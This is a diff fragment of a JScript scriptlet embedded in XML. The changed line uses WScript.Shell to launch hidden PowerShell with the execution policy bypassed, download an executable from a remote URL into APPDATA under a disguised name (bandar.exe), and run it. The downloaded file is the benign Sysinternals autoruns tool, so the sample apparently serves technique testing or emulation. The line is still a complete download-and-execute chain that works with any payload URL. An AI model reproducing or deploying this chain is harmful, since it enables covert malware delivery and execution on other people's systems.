@@ -21,7 +21,7 @@
 	<script language="JScript">
 		<![CDATA[
  
-			var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/autoruns.exe',"$env:APPDATA\bandar.exe");Start-Process ("$env:APPDATA\bandar.exe")");
+			var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/autoruns.exe',"$env:APPDATA\bandar.exe");Start-Process ("$env:APPDATA\bandar.exe")");
 ");
  
 		]]>
